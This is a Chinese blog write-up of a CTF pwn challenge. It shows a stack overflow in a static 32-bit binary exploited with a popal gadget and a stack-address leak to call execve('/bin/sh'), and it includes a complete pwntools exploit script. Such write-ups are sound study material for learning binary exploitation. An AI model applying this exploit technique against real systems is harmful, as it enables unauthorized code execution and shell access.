---
title: 关于popal指令的一道pwn
top: 31
tags:
  - popal指令
  - lab
  - trick
categories: 私房菜
password: he13716649461
abbrlink: 8179f351
---

### README:

> using pop, control your registers

### 保护策略：

![image-20221115103244604](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211151032941.png)



在本题中的main函数里只有两个用汇编代码直接写成的函数，分别是read和write

![image-20221115102929582](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211151029803.png)

因为没有canary，所以本题可以直接溢出。能够溢出0x100个字节的数据。



### 利用思路：

由于是静态链接，看到这种题目第一反应就是去打一个SROP,控制read为sigreturn的返回值，然后执行int 0x80来精准的控制各个寄存器的值从而获取shell。

但是这种方法实际是行不通的，因为我们要控制各个寄存器，最终需要用到三百多个字节来布置。但是只能溢出0x100个字节，用pwntools中的SigreturnFrame()是无法布置的，迁移以及其他情况我也考虑了一下，都行不通。

结合本题的readme，应该是要利用pop来控制寄存器的值。我们用ropgadget搜一下能用的gadget，发现有一个popal这个指令

![image-20221115104353625](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211151043248.png)



百度了一下，了解到这个指令可以将栈里的数据弹给各个寄存器。

实验了一下，popal指令相当于如下指令,？那个地方的值似乎没有弹给任何寄存器(但是我猜测大概率是弹到了某个寄存器但是被覆盖掉了)

```
pop edi
pop esi
pop ebp
pop ?
pop ebx
pop edx
pop ecx
pop eax
```



知道了popal指令的用法，那这道题的思路就很明朗了，我们可以用这个指令来直接执行系统调用execve(“/bin/sh\x00”,0,0) eax ebx ecx edx都可以被控制

而/bin/sh我们可以写到栈里，在这之前我们只需要泄露下栈地址即可。因为第一次read可以输入512个字节，而write也可以打印出来512个字节，这意味着如果输入的内容不满512个字节，那么就会一直泄露知道512个字节的地方，泄露的内容里一定会有栈地址。

最后执行popal前后的情况如下：

![image-20221115110840367](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211151108581.png)

![](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211151110032.png)

### EXP：

```py
from tools import *
context.log_level='debug'
context.arch='i386'
p=load("./a")
data_addr=0x08049148
pop_rsp=0x080480c9
debug(p)
int0x80=0x080480FD
popal=0x080480f3

payload=b'a'*0x100+p32(0x08048127)
p.send(payload)
p.recv(4)
stack_addr=u32(p.recvuntil(b'\xff')[-4:])+0x24
log_addr('stack_addr')
pause()
payload=b'a'*0x100+p32(popal)+b'aaaa'+b'bbbb'+b'cccc'+b'dddd'+p32(stack_addr)+p32(0)+p32(0)+p32(11)+p32(int0x80)+b'/bin/sh\x00'
p.send(payload)
p.interactive()
```

![image-20221115111128456](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211151111936.png)

### 题目附件：

链接: https://pan.baidu.com/s/1b1j7AVClengyAocClRfoYg?pwd=y59s 提取码: y59s 